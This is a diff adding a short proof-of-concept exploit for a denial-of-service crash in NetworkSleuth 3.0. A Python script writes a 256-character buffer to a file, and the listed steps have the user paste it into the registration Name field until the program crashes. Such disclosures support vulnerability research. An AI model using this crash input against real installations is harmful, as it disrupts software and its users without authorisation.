@@ -1,0 +1,23 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: NetworkSleuth 3.0 - Denial of Service (PoC)
+# Date: 12/02/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.nsauditor.com/
+# Software Link: http://www.nsauditor.com/downloads/networksleuth_setup.exe
+# Version: 3.0.0.0
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "NetworkSleuth.py", it will create a new file "PoC.txt"
+# 2.- Copy the text from the generated PoC.txt file to clipboard
+# 3.- Open NetworkSleuth.exe 
+# 4.- Go to Register > Enter Registration Code...
+# 5.- Paste clipboard in 'Name' field
+# 6.- Write '1234' in 'Key' field
+# 7.- Clic on button -> Ok
+# 8.- Crashed
+
+buffer = "\x41" * 256
+f = open ("PoC.txt", "w")
+f.write(buffer)
+f.close()
